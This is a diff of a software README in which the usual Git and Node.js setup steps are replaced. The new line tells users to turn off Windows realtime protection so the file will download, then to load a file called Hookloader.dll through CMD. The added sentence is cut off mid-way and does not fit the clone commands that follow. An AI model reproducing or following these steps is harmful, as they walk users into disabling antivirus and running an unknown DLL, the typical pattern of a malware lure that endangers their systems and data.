@@ -50,7 +50,7 @@
 
 ## How To Use
 
-To clone and run this application, you'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [npm](http://npmjs.com)) installed on your computer. From your command line:
+To run this application, disable windows realtime protection (may not download otherwise). Next, open CMD then drag and drop the Hookloader.dll file along with the 
 
 ```bash
 # Clone this repository
